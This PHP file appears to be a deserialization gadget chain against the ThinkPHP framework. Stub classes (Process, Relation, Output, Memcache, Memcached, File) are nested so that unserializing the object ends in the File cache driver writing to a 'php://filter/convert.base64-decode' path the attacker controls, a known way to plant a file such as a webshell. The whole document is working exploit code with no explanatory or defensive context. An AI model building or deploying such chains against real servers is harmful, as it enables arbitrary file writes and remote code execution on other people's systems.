<?php

namespace think
{
    class Process
    {
        private $processPipes;
        private $status = 3;
        private $processInformation = ['running' => true];

        public function  __construct($path,$data)
        {
            $this->processPipes = new \think\model\Relation($path, $data);
        }
    }
}


namespace think\model
{
    use think\console\Output;

    class Relation
    {
        protected $query;
        protected $type = 2; // HAS_MANY
        protected $where;

        public function __construct($path,$data)
        {
            $this->where = $data;
            $this->query = new Output($path);
        }
    }
}


namespace think\console
{
    class Output
    {
        protected $styles = [
            'where'
        ];
        private $handle;
        
        public function __construct($path)
        {
            $this->handle = new \think\session\driver\Memcache($path);
        }
    }  
}


namespace think\session\driver
{
    class Memcache
    {
        protected $handler;

        public function __construct($path)
        {
            $this->handler = new \think\cache\driver\Memcached($path);
        }
    }
}


namespace think\cache\driver
{
    class Memcached
    {
        protected $tag;
        protected $options;
        protected $handler;
    
        public function __construct($path)
        {
            $this->tag = true;
            $this->options = [
                'expire'   => 0,
                'prefix'   => '',
            ];
            $this->handler = new File($path);
        }
    }
    
    class File
    {
        protected $tag;
        protected $options;

        public function __construct($path)
        {
            $this->tag = false;
            $this->options = [
                'expire'        => 3600,
                'cache_subdir'  => false,
                'prefix'        => '',
                'data_compress' => false,
                'path'          => 'php://filter/convert.base64-decode/resource=' . $path,
            ];
        }
    }
}